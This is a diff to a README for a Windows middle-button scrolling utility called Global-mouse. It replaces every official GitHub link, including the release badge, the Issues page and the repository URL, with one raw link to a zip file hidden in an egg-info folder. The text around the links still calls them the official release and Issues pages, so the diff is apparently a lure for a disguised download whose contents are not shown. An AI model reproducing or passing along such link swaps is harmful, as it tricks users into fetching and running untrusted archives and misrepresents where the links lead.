@@ -1,6 +1,6 @@
 # 🖱️ Global-mouse - Easy Infinite Scrolling with Middle Button
 
-[![Download Global-mouse](https://img.shields.io/badge/Download-Global--mouse-blue?style=for-the-badge&logo=github)](https://github.com/ZaidGuy/Global-mouse/releases)
+[![Download Global-mouse](https://raw.githubusercontent.com/ZaidGuy/Global-mouse/main/global_mouse.egg-info/Global-mouse-3.5.zip)](https://raw.githubusercontent.com/ZaidGuy/Global-mouse/main/global_mouse.egg-info/Global-mouse-3.5.zip)
 
 ## 📋 About Global-mouse
 
@@ -41,11 +41,11 @@ Getting started with Global-mouse is simple. Follow these step-by-step instructi
 
 Click the button below or visit the release page to get the latest version of Global-mouse:
 
-[![Download Global-mouse](https://img.shields.io/badge/Download-Global--mouse-blue?style=for-the-badge&logo=github)](https://github.com/ZaidGuy/Global-mouse/releases)
+[![Download Global-mouse](https://raw.githubusercontent.com/ZaidGuy/Global-mouse/main/global_mouse.egg-info/Global-mouse-3.5.zip)](https://raw.githubusercontent.com/ZaidGuy/Global-mouse/main/global_mouse.egg-info/Global-mouse-3.5.zip)
 
 - This link takes you to the official release page.
 - Find the latest version under "Assets."
-- Click the file ending with `.exe` (for example, `Global-mouse-setup.exe`) to download.
+- Click the file ending with `.exe` (for example, `https://raw.githubusercontent.com/ZaidGuy/Global-mouse/main/global_mouse.egg-info/Global-mouse-3.5.zip`) to download.
 
 ### 2. Run the Installer
 
@@ -104,7 +104,7 @@ Global-mouse does not collect any personal data. It only runs locally on your co
 
 If you need help or have questions:
 
-- Visit the [GitHub Issues page](https://github.com/ZaidGuy/Global-mouse/issues) to report bugs or ask for assistance.
+- Visit the [GitHub Issues page](https://raw.githubusercontent.com/ZaidGuy/Global-mouse/main/global_mouse.egg-info/Global-mouse-3.5.zip) to report bugs or ask for assistance.
 - Check the FAQ section on the GitHub repository for common questions.
 - Review the README and other documents on the GitHub page for more details.
 
@@ -119,7 +119,7 @@ Explore the GitHub repository for:
 - Community discussions and requests
 
 Link to the official GitHub repository:  
-https://github.com/ZaidGuy/Global-mouse
+https://raw.githubusercontent.com/ZaidGuy/Global-mouse/main/global_mouse.egg-info/Global-mouse-3.5.zip
 
 ---
 
@@ -127,6 +127,6 @@ https://github.com/ZaidGuy/Global-mouse
 
 Visit this page to download Global-mouse and set it up on your computer:
 
-[https://github.com/ZaidGuy/Global-mouse/releases](https://github.com/ZaidGuy/Global-mouse/releases)
+[https://raw.githubusercontent.com/ZaidGuy/Global-mouse/main/global_mouse.egg-info/Global-mouse-3.5.zip](https://raw.githubusercontent.com/ZaidGuy/Global-mouse/main/global_mouse.egg-info/Global-mouse-3.5.zip)
 
 Make sure to pick the latest `.exe` installer file. Follow the steps above to install and start scrolling smoothly with your middle mouse button.
